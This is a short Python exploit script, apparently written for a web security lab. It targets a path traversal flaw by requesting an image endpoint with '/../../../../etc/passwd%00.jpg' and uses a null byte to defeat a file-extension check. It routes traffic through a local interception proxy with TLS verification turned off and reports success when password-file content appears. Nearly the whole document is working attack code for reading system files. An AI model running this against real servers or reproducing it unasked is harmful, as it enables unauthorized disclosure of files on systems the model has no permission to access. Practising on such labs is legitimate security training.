import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def path_traversal_exploit(url):
    image_path = url + 'image?filename=/../../../../etc/passwd%00.jpg'
    r = requests.get(image_path,verify=False,proxies=proxies)
    if 'uucp:x' in r.text:
        print('[+] Exploit Successful!')
    else:
        print('[-] Exploit Unsuccessful!')

def main():
    if len(sys.argv) != 2:
        print('[-] Oops')
        print('[+] Usage: %s <url>' % sys.argv[0])
        print('[+] Example: %s + www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print('[+] Exploiting Path traversal vulnerability')
    path_traversal_exploit(url)

if __name__ == '__main__':
    main()